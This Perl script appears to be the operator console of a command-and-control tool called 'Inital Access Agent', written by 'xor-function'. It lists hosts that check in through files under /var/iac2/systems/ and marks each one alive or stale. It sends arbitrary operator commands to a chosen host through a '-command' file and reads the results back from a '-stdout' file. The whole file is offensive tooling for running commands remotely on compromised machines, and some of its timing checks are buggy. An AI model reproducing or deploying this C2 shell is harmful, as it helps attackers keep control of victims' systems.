#!/usr/bin/perl
#
# inital access agent command shell
# xor-function

use strict;
use Digest::MD5;
use File::Path qw(make_path rmtree);

if ($> != 0 ) { die "[!] you must run this as root!\n"; }

sub banner {

        print '[]===========================================================[]'."\n";
        print '[] Inital Access Agent                         command shell []'."\n";
        print '[]===========================================================[]'."\n\n";

}

sub isalive{

        my $sysname = $_[0];
        my $opsys = $_[1];
        my $uuid = $_[2];
        my $lastmod = $_[3];
        my $currenttime = $_[4];

        my $info = '[+][ALIVE]|' . $sysname . '|' . $opsys . '|' . $uuid . ' |[Last Checkin]: '. $lastmod;
        return $info;

}

sub isdead{

        my $sysname = $_[0];
        my $opsys = $_[1];
        my $uuid = $_[2];
        my $lastmod = $_[3];
        my $currenttime = $_[4];

        my $info = '[-][STALE]|' . $sysname . '|' . $opsys . '|' . $uuid . ' |[Last Checkin]: '. $lastmod;
        return $info;
}

sub parse_status{

        my $systems = '/var/iac2/systems/';
        my @contents = glob("$systems*");

        my @systemlist;
        foreach my $cont (@contents)
        {

        # $mday is the day of the month and $mon the month in the range 0..11 , with 0 indicating
        # January and 11 indicating December. So to get the months in a more familiar format 1..12
                #       $mon += 1;
                #
        #
        # $year contains the number of years since 1900. To get a 4-digit year write:
        #       $year += 1900;
        #
        # $wday is the day of the week, with 0 indicating Sunday and 3 indicating Wednesday.
        # $yday is the day of the year, in the range 0..364 (or 0..365 in leap years.)

                if ((!($cont =~ /-command/ )) && (!($cont =~ /-stdout/))) {

                        my $info;
                        my $lastmod = localtime((stat $cont)[9]);
                        my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime((stat $cont)[9]);
                        $mon += 1; $year += 1900;

                        my $currenttime = localtime();
                        my ($csec,$cmin,$chour,$cmday,$cmon,$cyear,$cwday,$cyday,$cisdst) = localtime();
                        $cmon += 1; $cyear += 1900;

                        my $delimiter = '/systems/';
                        my ($bucket, $logname) = split( $delimiter, $cont);
                        my ($sysname, $opsys, $uuid) = split(/::/, $logname);

                        # Check if it's the same day.
                        if ( $cyday eq $yday )
                        {

                                # generate range
                                $cmin += '60';
                                $min += '60';
                                my $dif = $min - $cmin;
                                my $pdif = abs($dif);
                                if ( $pdif >= '0' && $pdif <= '30' ) {
                                        $info = isalive($sysname, $opsys, $uuid, $lastmod, $currenttime);
                                        push @systemlist, $info;
                                } else {
                                        $info = isdead($sysname, $opsys, $uuid, $lastmod, $currenttime);
                                        push @systemlist, $info;
                                }
                        }
                         else {
                                # get last hour if check time was in hr 24
                                # check last minutes.
                                if ( $min >= '57' && $min <= '59' ) {
                                        if ( $hour eq '24' ) {

                                                $info = isalive($sysname, $opsys, $uuid, $lastmod, $currenttime);
                                                 push @systemlist, $info;

                                        } else {
                                                 $info = isdead($sysname, $opsys, $uuid, $lastmod, $currenttime);
                                                 push @systemlist, $info;
                                        }

                                } else {
                                                $info = isdead($sysname, $opsys, $uuid, $lastmod, $currenttime);
                                                 push @systemlist, $info;
                                }
                        }

                }
        }

        foreach my $item (@systemlist) { print $item . "\n"; };
        print "\n";
}

# host dir is now /var/iac2/systems/
sub gen_hosts {

        my $hosts_dir = '/var/iac2/systems/';
        my @contents = grep {!/^$|-stdout|-command/} <$hosts_dir*>;
        return @contents;
}


sub list_hosts {

        my @hosts = @_;
        my @systems;
        foreach (@hosts) {
                my ($root, $var, $iac2, $systems, $host) = split '/', $_;
                push @systems, $host;
        }

        my $value = '0';
        foreach (@systems) {
                print '[' . $value . ']' . '-> ' . $_ . "\n";
                $value ++
        }
        print "\n";

        my $selection;
        my $opt;

        while (1) {

                print "[*] Select system number you wish to execute commands in.\n";
                $selection = <STDIN>;
                chomp($selection);

                while (1) {

                        if ( $selection !~ /[0-9]/g ) {
                                print "[!] Thats not a number! Try again.\n";
                                $selection = <STDIN>;
                                chomp($selection);
                        }
                        elsif (!defined($hosts[$selection])) {
                                print "[!] Thats not on the list! Try again.\n";
                                $selection = <STDIN>;
                                chomp($selection);
                        }
                        else { last;}

                }

                print "[+] you entered: [ $selection ]\n";
                print "[?] Is this correct? (yes/no)?\n";

                $opt = <STDIN>;
                chomp($opt);

                if ($opt =~ /y/i or $opt =~ /yes/i ) {
                        last;
                }
                elsif ($opt =~ /n/i or $opt =~ /no/i ) {
                        print "[!] Re-enter selection.\n";
                }
                else {  print "[*] Input not understood, re-enter option.\n"; }

        }#end while

        return $systems[$selection];

}

sub proc_cmds {

        my $client = $_[0];
        my $client_path = '/var/iac2/systems/' . $client;

        my $command = $client_path . '-command';
        my $stdout = $client_path . '-stdout';

        my $cmd_string;
        my $opt;
        while (1) {
                print "[*] Enter the command you wish to execute\n";
                print "[*] in $client\n";
                print "[*] Press enter when done:\n";
                $cmd_string = <STDIN>;
                chomp($cmd_string);

                print "[+] you entered: [ $cmd_string ]\n";
                print "[?] Is this correct? (yes/no)?\n";

                $opt = <STDIN>;
                chomp($opt);

                if ($opt =~ /y/i or $opt =~ /yes/i ) {
                        print "[*] waiting for response...\n";
                        last;
                }
                elsif ($opt =~ /n/i or $opt =~ /no/i ) {
                        print "[!] Re-enter selection.\n";
                }
                else {  print "[*] Input not understood, re-enter option.\n"; }

        } # end while

        my $trigger = 'echo [>][Command Output]' . ' & ';

        # using a backtick so it can be interpreted correctly in powershell
        open (my $fh, '+>', "$command" );
                print $fh $trigger . $cmd_string;
        close $fh;

        # Test for stability
        if ( $cmd_string =~ /exit/i ) {
                print '[*] Waiting 20 secs for client to receive exit command...' . "\n";
                sleep(20);
                rmtree($client_path);
                # Return "no". Automatically returns shell to selection menu.
                return 'no';

        } else {

                my $lastmod = (stat($stdout))[9];
                my $chkmod = (stat($stdout))[9];

                #print "[lastmod] $lastmod \n";
                #print "[chkmod ] $chkmod \n";

                # waiting for client to upload executed command result.
                while ( $lastmod eq $chkmod ) {
                        $chkmod = (stat($stdout))[9];

                        #print "[inloop chkmod ] $chkmod \n";
                        #print "[inloop lastmod] $lastmod \n";
                        sleep(1);

                }

                # Reading Response
                print "[+] Got Response!\n";

                open(my $rfh, '<', "$stdout");
                        while (<$rfh>) { print $_; }
                close $rfh;

                #open ($rfh, '>', "$stdout");
                #close $rfh;

                undef $opt;
                while (1) {

                        print "[*] Do you wish to execute another command?\n";
                        print "[*] [yes/no]\n";

                        $opt = <STDIN>;
                        chomp($opt);

                        if ($opt =~ /y/i or $opt =~ /yes/i ) {
                                last;
                        }
                        elsif ($opt =~ /n/i or $opt =~ /no/i ) {
                                print "[!] exiting to selection menu...\n";
                                return 'no';
                                last;
                        } else {  print "[*] Input not understood, re-enter option.\n"; }


                } # end while

        }


}

sub main {

        while (1) {

                if (!gen_hosts()){ print "[!] No client has reported in yet.\n"; print "[!] waiting.\n"; }
                while (!gen_hosts()) {
                        print "[!] waiting.\r";
                        sleep(5);
                }

                print "[!] Status of avaliable hosts.\n\n";

                my @sys_hosts = gen_hosts();
                parse_status();
                my $client = list_hosts(@sys_hosts);

                while (1)
                {
                        my $choice = proc_cmds($client);
                        if ( $choice eq 'no' ) { last; }
                }

        }# end while

}


banner();
main();
exit(0);
